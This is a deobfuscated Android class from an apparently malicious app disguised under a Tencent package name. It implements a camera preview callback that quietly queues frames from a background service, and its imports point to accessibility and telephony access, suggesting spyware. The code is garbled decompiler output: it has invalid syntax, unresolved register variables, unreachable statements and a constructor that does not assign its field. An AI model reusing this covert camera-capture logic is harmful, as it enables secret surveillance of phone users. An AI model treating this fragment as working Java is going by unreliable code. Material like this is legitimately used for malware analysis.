package com.tencent;

import android.content.*;
import android.view.*;
import android.widget.*;
import android.app.*;
import android.os.*;
import android.accessibilityservice.*;
import android.view.accessibility.*;
import android.telephony.*;
import android.media.*;
import java.util.*;
import java.io.*;
import java.net.*;

/**
 * Deobfuscated class: SecondaryBackgroundService_2
 * Original: Lcom/tencent/tunesxconcerningn106$2;
 */
class SecondaryBackgroundService_2 implements Camera$PreviewCallback; {

    // === FIELDS ===
    final SecondaryBackgroundService this$0;

    // === METHODS ===

     void Constructor(SecondaryBackgroundService param0) {
        v0.this$0 = v1;
        // new Object()
        return;
    }

    public void onPreviewFrame(byte[] param0, Camera param1) {
        if (v2 != null && v2 != 0) { // goto +3
        return;
        v3 = SecondaryBackgroundService.s_tunesxconcerningn106_k;
        if (v3 == null || v3 == 0) { // goto +32
        v3 = v1.this$0;
        v3 = v3.ctd;
        v0 = 1;
        if (v3 != 1) { // goto +25
        v3 = SecondaryBackgroundService.o_tunesxconcerningn106_ut;
        if (v3 == null || v3 == 0) { // goto +21
        SecondaryBackgroundService.access$100();
        synchronized (v3) {
        SecondaryBackgroundService.access$200(1);
        1.add(v2);
        }
        // goto (branch)
        }
        throw v2;
        return;
    }
}
